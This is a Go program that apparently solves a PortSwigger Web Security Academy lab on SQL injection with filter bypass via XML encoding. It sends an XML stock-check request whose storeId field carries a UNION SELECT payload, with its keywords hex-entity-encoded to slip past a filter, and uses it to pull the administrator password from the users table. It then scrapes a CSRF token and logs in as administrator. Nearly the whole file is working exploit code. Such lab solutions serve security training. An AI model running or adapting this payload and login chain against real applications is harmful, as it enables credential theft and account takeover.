// https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0ad7002603107e39c0d40c3c00e8005e.web-security-academy.net"
	productUrl := u + "/product/stock"
	loginUrl := u + "/login"

	pass, err := adminPassword(productUrl, client)
	if err != nil {
		return err
	}
	fmt.Println("Admin password:", pass)

	csrfToken, err := parseCSRFToken(loginUrl, client)
	if err != nil {
		return err
	}

	return login(loginUrl, "administrator", pass, csrfToken, client)
}

func adminPassword(u string, client *http.Client) (string, error) {
	payload := strings.NewReader(`<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1 &#x75;nion &#x53;ELECT password &#x46;ROM users &#x77;here username = &#x27;administrator&#x27;&#x2d;- </storeId></stockCheck>`)
	resp, err := client.Post(u, "application/xml", payload)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	scanner := bufio.NewScanner(resp.Body)
	scanner.Scan()
	return scanner.Text(), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func parseCSRFToken(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))

	return string(csrfRE.FindSubmatch(body)[1]), nil
}

func login(u, username, password, csrfToken string, client *http.Client) error {
	resp, err := client.PostForm(u, url.Values{"username": {"administrator"}, "password": {password}, "csrf": {csrfToken}})
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	fmt.Println(string(body))
	return nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	//u2, _ := url.Parse("http://127.0.0.1:8888")

	return &http.Client{
		Jar: jar,
		//Transport: &http.Transport{Proxy: http.ProxyURL(u2)},
	}, nil
}
